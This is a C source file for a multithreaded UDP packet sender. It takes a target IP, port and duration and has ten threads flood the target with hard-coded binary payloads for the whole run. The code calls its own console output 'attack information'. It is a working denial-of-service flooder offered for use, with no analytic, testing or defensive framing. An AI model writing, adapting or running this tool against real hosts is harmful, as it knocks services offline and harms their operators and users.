#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

// Define the number of threads
#define NUM_THREADS 10 // Change this value to adjust the number of threads

// Function to display usage information
void usage() {
    printf("Usage: ./packet_sender ip port time\n");
    exit(1);
}

// Structure to pass data to each thread
struct thread_data {
    char *ip;
    int port;
    int time;
};

// Structure to store payloads and their sizes
struct payload {
    unsigned char *data;
    size_t size;
};

// Function that each thread will execute to send packets
void *send_packets(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    // Example binary payloads (byte arrays) with their sizes
    struct payload payloads[] = {
    {(unsigned char[]){0x00, 0x00, 0x01, 0xdd, 0x41, 0xd9, 0xf6, 0x51, 0x04, 0x48, 0x9a, 0x09, 0xd4, 0x20, 0xe7, 0x4d, 0xd1, 0x0a, 0x65, 0x2e, 0xff, 0xd7, 0xa9, 0xee, 0xa7, 0x3b, 0xd2, 0xb1, 0x58, 0xe5, 0xa7, 0x3a, 0x12, 0xc1, 0xe6, 0xfc, 0xe0, 0xe1, 0xc1, 0x7b, 0x60, 0xc5, 0xb1, 0xcf, 0xa6, 0xdd, 0xcd, 0x48, 0x1d, 0x2c, 0x20, 0x2f, 0x7d, 0x2a, 0xe4, 0x7c, 0xae, 0x7e, 0x34, 0x10, 0x37, 0xf4, 0x58, 0x3d}, 64},
    {(unsigned char[]){0x00, 0x00, 0x02, 0xba, 0x41, 0xd9, 0xf6, 0x51, 0x04, 0x48, 0x9b, 0xb7, 0xd6, 0xea, 0xb7, 0x18, 0x6b, 0xb2, 0x41, 0xc0, 0x52, 0x64, 0x9b, 0xa2, 0xd9, 0x22, 0x58, 0x25, 0xe0, 0x65, 0x03, 0x48, 0xe9, 0x8e, 0x8b, 0xc0, 0x9b, 0xbc, 0xb0, 0x03, 0x7e, 0x42, 0x84, 0x89, 0xea, 0xef, 0x5b, 0xdc, 0xf8, 0xaa, 0x6e, 0x72, 0x9f, 0x0b, 0xaa, 0x7f, 0x16, 0x9e, 0xde, 0x56, 0xe1, 0xb7, 0x5e, 0x96, 0xd3, 0x35, 0xf8, 0xf7, 0xd6, 0x98, 0xa5, 0x4f, 0xff, 0xe4, 0x33, 0x98, 0x39, 0x11, 0xec, 0xc4, 0xa6, 0xb2, 0x16, 0x45, 0xd3, 0x40, 0xdd, 0xcf, 0x79, 0xc1, 0x83, 0x1b, 0x33, 0xa8, 0xf1, 0xf4, 0xa8, 0xf7, 0x07, 0x57, 0x17, 0xec, 0x54, 0x9e, 0x99, 0x2e, 0x4c, 0x9a, 0x16, 0x3a, 0xe0, 0xa6, 0x89, 0x2d, 0x77, 0x13, 0x3a, 0xb6, 0x3b, 0xd9, 0x66, 0x55, 0xe9, 0x84, 0x43, 0x11, 0x83, 0xbf}, 128},
    {(unsigned char[]){0x78, 0x9c, 0x01, 0x40, 0x00, 0xbf, 0xff, 0xcd, 0x67, 0x8d, 0x3c, 0xee, 0x3c, 0x13, 0xcb, 0x6d, 0x63, 0x3c, 0xa6, 0x36, 0x16, 0x75, 0x2c, 0xd1, 0x29, 0x93, 0x54, 0x10, 0x85, 0x49, 0x08, 0x3b, 0x06, 0xf6, 0xb6, 0x22, 0x05, 0xaa, 0x5c, 0x4e, 0xcc, 0x91, 0x67, 0x00, 0x93, 0xef, 0xaa, 0x78, 0x32, 0x6f, 0xce, 0x77, 0xc9, 0xe8, 0x3c, 0x2d, 0xdc, 0x53, 0xb0, 0x37, 0xe2, 0xee, 0xcf, 0x6a, 0x08, 0xcc, 0x6c, 0xbe, 0xf0, 0xb0, 0xec, 0x89, 0x2b, 0x1e, 0xe5}, 75},
    {(unsigned char[]){0x78, 0x9c, 0x01, 0x80, 0x00, 0x7f, 0xff, 0x4d, 0xa8, 0x56, 0x1e, 0xcf, 0xe6, 0x8e, 0x65, 0x06, 0x56, 0x79, 0xd2, 0x01, 0xfa, 0x9a, 0xd8, 0x86, 0x5a, 0x45, 0xa4, 0x77, 0x6a, 0xd5, 0x9f, 0x7c, 0xb1, 0xae, 0x96, 0x3d, 0x40, 0x7f, 0x71, 0xc6, 0xab, 0x83, 0x47, 0xf9, 0xda, 0x6e, 0xc4, 0xce, 0x1a, 0xff, 0xe2, 0x9a, 0xa2, 0x89, 0x79, 0x8a, 0x4b, 0x46, 0x5f, 0x7f, 0xbf, 0x60, 0xdf, 0x1a, 0xe4, 0x0e, 0x06, 0xc2, 0x65, 0x44, 0x58, 0x81, 0xb6, 0xe9, 0x4f, 0x74, 0x72, 0xbe, 0x8c, 0xab, 0x6e, 0x38, 0x4c, 0x24, 0xcd, 0xbc, 0xd0, 0x83, 0xe4, 0xbe, 0x5c, 0xb5, 0xf0, 0xe1, 0xbf, 0xb4, 0x09, 0xe8, 0xb3, 0xfe, 0x2b, 0xfa, 0xec, 0xec, 0xae, 0x8a, 0x23, 0x7a, 0x5d, 0x42, 0x9f, 0x6d, 0x3a, 0x0c, 0xba, 0xe4, 0x4f, 0x22, 0x60, 0xe7, 0x0e, 0x64, 0xf3, 0x94, 0x3a, 0xc0, 0x66, 0x38, 0x5d, 0x23, 0xbb, 0xc9, 0x0d, 0x83, 0x13, 0x39, 0xc2, 0x43, 0x5b}, 139},
    {(unsigned char[]){0x01, 0x9b, 0x7e, 0x83, 0xaa, 0x46, 0x04, 0xd0, 0x15, 0x25, 0x80, 0xc2, 0xb8, 0xe4, 0x9f, 0x9a, 0x76, 0x55, 0xa9, 0x37, 0x22, 0xbd, 0x58, 0x14, 0x7d, 0xa5, 0x2c, 0x0a, 0x4f, 0xe0, 0xa7, 0x41, 0x50, 0xa6, 0x40, 0x87, 0x6e, 0xca, 0x6a, 0xe2, 0xb4, 0xaa, 0x49, 0x32, 0x40, 0x33, 0xfa, 0xa0, 0x48, 0xdd, 0xfb, 0x50, 0x26, 0xb8, 0x56, 0xf1, 0xc4, 0x2a, 0x2a, 0xbf, 0x32, 0xa3, 0xc4, 0x0a, 0x1b, 0xd9, 0x5a, 0x08, 0x53, 0x01, 0x99, 0x40, 0x7f, 0xfa, 0x5a, 0xfa, 0x18, 0xd7, 0xf3, 0x6b, 0x81, 0x1c, 0x3c, 0xe3, 0x35, 0xa1, 0x8f, 0x09, 0x24, 0x9b, 0x5d, 0x96, 0x97, 0xaf, 0x9b, 0xb7, 0xb0, 0xd7, 0x85, 0x6a, 0xdb, 0x46, 0xde, 0x62, 0xb3, 0x00, 0x19, 0x66, 0x10, 0x4d, 0x59, 0x5c, 0x7b, 0x83, 0x1f, 0x2e, 0x40, 0x4f, 0xfb, 0x72, 0x3f, 0xce, 0x19, 0xef, 0x21, 0x8e, 0x4e, 0xd1}, 128},
    {(unsigned char[]){0x5a, 0x6c, 0xfe, 0xda, 0xc7, 0xe1, 0xa9, 0x7a, 0x85, 0xc9, 0x02, 0x96, 0x73, 0xaf, 0x5e, 0xa2, 0x5f, 0x3c, 0xaf, 0x54, 0xe2, 0x3c, 0xbb, 0xbe, 0x91, 0x77, 0xb7, 0x77, 0x3f, 0xed, 0xd9, 0x78, 0xe5, 0xb6, 0x6a, 0x5d, 0xcc, 0x49, 0x31, 0xb8, 0x60, 0x58, 0x11, 0x38, 0x23, 0x2a, 0x5e, 0x45, 0xb6, 0x3d, 0x45, 0x46, 0x56, 0x37, 0xa2, 0xbb, 0xea, 0x6c, 0xb3, 0xf4, 0x0d, 0x22, 0x12, 0x29, 0x7f, 0x92, 0xe6, 0xef, 0x0d, 0xb2, 0x0b, 0x44, 0x49, 0xdd, 0x68, 0x05, 0x32, 0x2a, 0x94, 0x21, 0x8d, 0xd2, 0x32, 0x82, 0xf2, 0xab, 0xd2, 0xd2, 0x22, 0x08, 0x4d, 0x6b, 0xf6, 0xc7, 0xe3, 0x97, 0x97, 0x4b, 0xf4, 0x3a, 0x50, 0x5f, 0x12, 0xab, 0x40, 0xe8, 0xbe, 0xf2, 0x0c, 0xb2, 0xed, 0x8c, 0xb8, 0x1d, 0x96, 0xb3, 0xf9, 0xf9, 0xb9, 0x21, 0x85, 0x12, 0x2c, 0xd9, 0x4e, 0xf5, 0x40, 0xb7}, 128},
    {(unsigned char[]){0x15, 0x64, 0xc4, 0x1b, 0x38, 0x9a, 0x0a, 0xf1, 0x86, 0xbd, 0x72, 0x3b, 0x13, 0xe5, 0x79, 0xea, 0x4f, 0xd6, 0x57, 0x94, 0x7c, 0xf9, 0x87, 0xbd, 0xcf, 0x65, 0x06, 0xf4, 0x5e, 0x0d, 0xad, 0x7d, 0x3c, 0x88, 0x9b, 0xb3, 0xd8, 0x25, 0x10, 0xd2, 0x92, 0x35, 0x8e, 0x8e, 0xa7, 0x04, 0x87, 0xb5, 0x48, 0x97, 0xbe, 0xc7, 0xb2, 0x24, 0xeb, 0x1f, 0x90, 0x89, 0xe8, 0x30, 0xc0, 0x41, 0xb8, 0xb8, 0xec, 0xe2, 0x52, 0x9e, 0xc4, 0x28, 0x74, 0xfb, 0xfd, 0x73, 0x23, 0x8b, 0x31, 0x4b, 0x3d, 0x74, 0xf3, 0x86, 0x44, 0x21, 0xe1, 0xcf, 0x75, 0xf6, 0x86, 0xfb, 0xc5, 0x15, 0xbb, 0x84, 0xa9, 0x2b, 0x52, 0xd0, 0x0a, 0xa3, 0x5e, 0x58, 0x16, 0xc3, 0x9c, 0x3a, 0xcf, 0x22, 0xbd, 0xd5, 0xed, 0x17, 0x40, 0x9e, 0xdb, 0x70, 0x32, 0x64, 0xb1, 0xa8, 0xfb, 0xa7, 0xbe, 0x6b, 0x7d, 0x82, 0x9c, 0x1a}, 128},
    {(unsigned char[]){0xbf, 0x24, 0x66, 0xd1, 0x89, 0x35, 0xe5, 0xa6, 0x6d, 0xb9, 0xf0, 0xac, 0xc6, 0x90, 0xe4, 0x17, 0x4a, 0xc4, 0x29, 0xc7, 0x3c, 0xd1, 0xdd, 0x6e, 0x34, 0xd6, 0xff, 0xdc, 0x55, 0x53, 0xd3, 0x1a, 0xd4, 0x08, 0x80, 0x52, 0x86, 0xb1, 0x1e, 0xf7, 0x14, 0xe5, 0x79, 0xb1, 0x7d, 0x84, 0xd6, 0x2b, 0x2c, 0x57, 0xf7, 0x39, 0x20, 0x07, 0xed, 0xe6, 0xb1, 0x3a, 0x9a, 0xb2, 0x1b, 0x82, 0x49, 0x8e, 0x85, 0x3e, 0x3f, 0x09, 0xa5, 0xd3, 0x60, 0xe4, 0x4f, 0x0a, 0xf8, 0x4b, 0x37, 0xca, 0x4d, 0x41, 0xee, 0x78, 0xd8, 0x06, 0x61, 0xfe, 0x55, 0x49, 0x69, 0x33, 0x0d, 0xe2, 0x41, 0xf2, 0x4e, 0x2e, 0xa1, 0xd7, 0xaf, 0x65, 0xb4, 0x3e, 0x59, 0x16, 0x2c, 0x9c, 0x05, 0xff, 0x07, 0x6b, 0xa8, 0xe7, 0x88, 0xb0, 0x5a, 0xbd, 0x8f, 0x08, 0xb8, 0xdc, 0x43, 0x9e, 0x4d, 0xd2, 0x30, 0x9e, 0x12, 0x0f}, 128},
    {(unsigned char[]){0xa7, 0xad, 0xe9, 0x0e, 0xab, 0x32, 0x2a, 0xde, 0x7a, 0x0d, 0x5b, 0xd9, 0xb7, 0x64, 0x32, 0x67, 0x74, 0xef, 0x74, 0xea, 0x8a, 0xea, 0x2a, 0xcd, 0x9a, 0x8e, 0x82, 0x44, 0x38, 0x47, 0xe0, 0x27, 0x0d, 0xb4, 0xe6, 0x79, 0xd9, 0xec, 0xff, 0x40, 0xdd, 0xa2, 0x2d, 0x96, 0x1e, 0x2f, 0xd7, 0x64, 0x5a, 0x0e, 0x92, 0xf3, 0x6b, 0x40, 0x8d, 0xe3, 0x1a, 0x89, 0xf6, 0xfd, 0xb7, 0xa5, 0x2d, 0x00}, 64},
    {(unsigned char[]){0x1b, 0x01, 0x87, 0xbb, 0x86, 0x4f, 0xf8, 0x14, 0xa0, 0x84, 0xf7, 0x3e, 0x7a, 0xe8, 0x97, 0xd8, 0xe7, 0x54, 0x23, 0xde, 0xc4, 0xb2, 0xc9, 0x01, 0xbd, 0xc2, 0xc9, 0x8b, 0x47, 0x90, 0x34, 0xfb, 0xb4, 0x19, 0xb5, 0x64, 0x34, 0x25, 0x03, 0x90, 0xb3, 0xf0, 0x82, 0xa1, 0x28, 0x04, 0xe7, 0x29, 0x0a, 0xf1, 0x9e, 0xb2, 0x1b, 0x9f, 0xe9, 0x50, 0xc4, 0xd2, 0x85, 0x4f, 0x97, 0x78, 0x6f, 0x4c, 0x2a, 0xa7, 0x78, 0x91, 0x74, 0xba, 0xb3, 0x6f, 0x22, 0xec, 0xee, 0xca, 0x07, 0xf3, 0xb6, 0x1b, 0x75, 0x8c, 0x0f, 0x56, 0x7c, 0x0f, 0x59, 0x25, 0x55, 0xff, 0xf0, 0xc6, 0x22, 0xa8, 0xf3, 0xec, 0x12, 0x10, 0xdd, 0x98, 0x4d, 0xed, 0x48, 0xa4, 0x49, 0xe8, 0x90, 0xad, 0x33, 0x20, 0xaa, 0x4f, 0x9a, 0xb1, 0x62, 0x4b, 0xc6, 0x99, 0xeb, 0x38, 0x88, 0x52, 0x9a, 0xad, 0x43, 0xa1, 0x67, 0x00}, 128},
    {(unsigned char[]){0x00, 0x00, 0x02, 0x01, 0x41, 0xd9, 0xf6, 0x51, 0x04, 0x48, 0xb5, 0x2d, 0x54, 0x7c, 0x7c, 0x98, 0x72, 0x8f, 0xe6, 0x56, 0x12, 0x0f, 0x1e, 0x66, 0xdf, 0x42, 0x8d, 0x67, 0x92, 0xd5, 0x12, 0x1e, 0xb9, 0xd1, 0x79, 0x58, 0x32, 0xbb, 0xe5, 0x9e, 0x3d, 0xd0, 0x3b, 0x03, 0x70, 0x0e, 0x6e, 0x73, 0x5a, 0xc5, 0xbf, 0xd7, 0xf0, 0xc0, 0xbe, 0x1a, 0x57, 0xa2, 0x88, 0x93, 0xc0, 0x6b, 0xf4, 0xa1}, 64},
    {(unsigned char[]){0x00, 0x00, 0x00, 0xf6, 0x41, 0xd9, 0xf6, 0x51, 0x04, 0x48, 0xb6, 0x64, 0xb6, 0x35, 0xdb, 0x08, 0xe7, 0xf4, 0x80, 0x2d, 0x8d, 0xf5, 0x64, 0x8d, 0x9c, 0x4b, 0x64, 0x5f, 0x8a, 0xd4, 0x50, 0x76, 0x6c, 0x9d, 0x16, 0x39, 0x8a, 0xae, 0x2e, 0x97, 0xb3, 0x8d, 0x2d, 0x09, 0xba, 0x5b, 0x9e, 0xe5, 0xbc, 0x1c, 0x68, 0xbd, 0xbf, 0x9e, 0x4f, 0x30, 0xee, 0x06, 0xba, 0x94, 0xd0, 0xe2, 0x53, 0xe8}, 64},
    {(unsigned char[]){0x00, 0x00, 0x02, 0x4e, 0x41, 0xd9, 0xf6, 0x51, 0x04, 0x48, 0xb7, 0x96, 0xb7, 0x25, 0xf6, 0x4e, 0x8f, 0xf4, 0xb3, 0x8f, 0x74, 0x67, 0xeb, 0xe5, 0xa6, 0xa5, 0x95, 0x3a, 0xc9, 0x06, 0x4d, 0xef, 0x79, 0x97, 0x64, 0x5e, 0xa6, 0x25, 0xd5, 0xa6, 0x0a, 0xe6, 0x6e, 0xc5, 0x75, 0x5c, 0x70, 0xe9, 0xd6, 0xd5, 0x4f, 0x4d, 0x21, 0x7e, 0x26, 0xee, 0x69, 0xe8, 0x04, 0xd4, 0x94, 0xb2, 0xde, 0x20}, 64},
    {(unsigned char[]){0x00, 0x00, 0x00, 0xd3, 0x41, 0xd9, 0xf6, 0x51, 0x04, 0x48, 0xb8, 0xc0, 0x26, 0xb6, 0xa8, 0x5c, 0x0e, 0x32, 0x9e, 0xef, 0x3d, 0x78, 0xf0, 0x41, 0xa7, 0x97, 0x79, 0x9f, 0xa7, 0x82, 0x6b, 0xf7, 0xaa, 0x92, 0xd3, 0x8c, 0x94, 0x58, 0x6f, 0xf1, 0xf9, 0xa3, 0xf3, 0x2a, 0x8c, 0xae, 0x79, 0xc6, 0x67, 0xdd, 0xc5, 0xd6, 0xf0, 0x88, 0x62, 0xa2, 0x27, 0x9b, 0x8a, 0x7d, 0xde, 0xd4, 0xff, 0x9a}, 64},
    {(unsigned char[]){0x00, 0x00, 0x00, 0x52, 0x41, 0xd9, 0xf6, 0x51, 0x04, 0x48, 0xb9, 0xe4, 0x55, 0xbe, 0x86, 0x89, 0xdd, 0xee, 0x10, 0x35, 0xf0, 0x7f, 0x4c, 0x39, 0xb8, 0x5c, 0x10, 0xbe, 0x51, 0x61, 0x1a, 0x3a, 0x16, 0x9c, 0x86, 0x75, 0x0c, 0x6c, 0x26, 0x8a, 0xa0, 0xf9, 0x41, 0x8b, 0x90, 0xd0, 0xad, 0x42, 0xbf, 0xd2, 0xa4, 0x68, 0x39, 0xd6, 0xe7, 0x69, 0x60, 0x87, 0x0b, 0xb0, 0xe5, 0x7b, 0x04, 0x98}, 64},
    {(unsigned char[]){0x00, 0x00, 0x01, 0x83, 0x41, 0xd9, 0xf6, 0x51, 0x04, 0x48, 0xbb, 0x20, 0xe4, 0x95, 0x05, 0x4d, 0xb1, 0x95, 0x62, 0x8d, 0x23, 0x0e, 0xd9, 0x40, 0x76, 0xa5, 0xb2, 0x81, 0x5a, 0x6f, 0x53, 0xaa, 0x93, 0xf4, 0x25, 0x0a, 0x40, 0x53, 0x2d, 0xae, 0xba, 0x41, 0x79, 0x63, 0x1b, 0x9b, 0xf6, 0xed, 0xee, 0xe8, 0x78, 0x7e, 0xcd, 0x15, 0x35, 0x70, 0xbc, 0xf3, 0x5f, 0x73, 0x80, 0xec, 0x01, 0x80}, 64},
    {(unsigned char[]){0x00, 0x00, 0x01, 0x1a, 0x41, 0xd9, 0xf6, 0x51, 0x04, 0x48, 0xbc, 0x4d, 0x2b, 0xc5, 0xde, 0x6f, 0x2d, 0xf6, 0x64, 0x34, 0xd1, 0xe1, 0x30, 0x87, 0xc7, 0x6c, 0xcb, 0xa5, 0x7a, 0x2b, 0xe9, 0xde, 0x6e, 0x07, 0x5e, 0x8e, 0xe7, 0x31, 0x05, 0x8a, 0x80, 0xb9, 0xcf, 0x75, 0x92, 0x54, 0x0a, 0x54, 0xb5, 0x49, 0x19, 0x38, 0x73, 0xb9, 0x29, 0xc6, 0x14, 0xd8, 0x71, 0x5d, 0xa8, 0xb1, 0xc2, 0xbb}, 64},
    {(unsigned char[]){0x00, 0x00, 0x03, 0x6b, 0x41, 0xd9, 0xf6, 0x51, 0x04, 0x48, 0xbd, 0x76, 0xdc, 0x6f, 0x9d, 0xb1, 0xee, 0xbb, 0x41, 0x77, 0x3a, 0x45, 0x86, 0x4b, 0x9e, 0xb7, 0x78, 0xb4, 0xed, 0x32, 0xad, 0x8f, 0x83, 0x06, 0x39, 0xed, 0x7d, 0x96, 0x55, 0xe3, 0x16, 0x03, 0x7e, 0x8e, 0x45, 0xf5, 0xa0, 0x86, 0x50, 0x79, 0xa8, 0x98, 0x6b, 0x11, 0x85, 0x64, 0x66, 0x0c, 0x7e, 0xa5, 0x5e, 0x14, 0x57, 0xc6}, 64},
    {(unsigned char[]){0x00, 0x00, 0x00, 0x87, 0x41, 0xd9, 0xf6, 0x51, 0x04, 0x48, 0xbe, 0xa1, 0xd7, 0x28, 0xfa, 0x98, 0x75, 0xe3, 0x59, 0x12, 0x2f, 0x8d, 0xb1, 0x6e, 0xba, 0x09, 0x72, 0xe8, 0x67, 0xc3, 0x30, 0x5d, 0x77, 0xda, 0x23, 0x75, 0x4b, 0x6a, 0x3f, 0xf7, 0x70, 0xce, 0x95, 0xf7, 0x27, 0x6b, 0x94, 0x18, 0xae, 0xbe, 0xaf, 0xbe, 0xd9, 0xbe, 0x6b, 0x3d, 0xd9, 0x01, 0x7b, 0xe1, 0x2e, 0x2c, 0x95, 0x34}, 64},
    {(unsigned char[]){0x00, 0x00, 0x01, 0x38, 0x41, 0xd9, 0xf6, 0x51, 0x04, 0x48, 0xbf, 0xd1, 0xc0, 0xa1, 0x83, 0x10, 0x9c, 0x2b, 0xc3, 0xc9, 0x15, 0x6d, 0xe7, 0x9d, 0x04, 0xb9, 0x05, 0xa1, 0xdd, 0xbb, 0xc4, 0xd5, 0x81, 0xfa, 0x33, 0x18, 0x01, 0x9d, 0xc2, 0x07, 0x0f, 0x1f, 0xd6, 0x24, 0xa4, 0x98, 0xb5, 0x36, 0xa6, 0xa7, 0x0c, 0xa3, 0x80, 0x2e, 0x62, 0x8a, 0x91, 0xfe, 0xde, 0x51, 0x59, 0x1d, 0xc7, 0xaa}, 64},
    {(unsigned char[]){0x43, 0x75, 0x73, 0x74, 0x6f, 0x6d, 0x50, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64}, 13},
};

    // Number of payloads
    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);

    // Create UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Setup server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    // Calculate end time for the thread
    endtime = time(NULL) + data->time;

    // Keep sending packets until the specified time expires
    while (time(NULL) <= endtime) {
        for (int i = 0; i < num_payloads; i++) {
            if (sendto(sock, payloads[i].data, payloads[i].size, 0, 
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    // Close the socket after sending is done
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    // Parse the command-line arguments
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);

    // Allocate memory for thread IDs 
    pthread_t thread_ids[NUM_THREADS];
    struct thread_data data = {ip, port, time};

    // Print attack information
    printf("Sending packets to %s:%d for %d seconds with %d threads\n", ip, port, time, NUM_THREADS);

    // Create threads for sending packets
    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&thread_ids[i], NULL, send_packets, (void *)&data) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        printf("Thread %lu created.\n", thread_ids[i]);
    }

    // Wait for all threads to finish
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    // Print completion message
    printf("Packet sending finished.\n");
    return 0;
}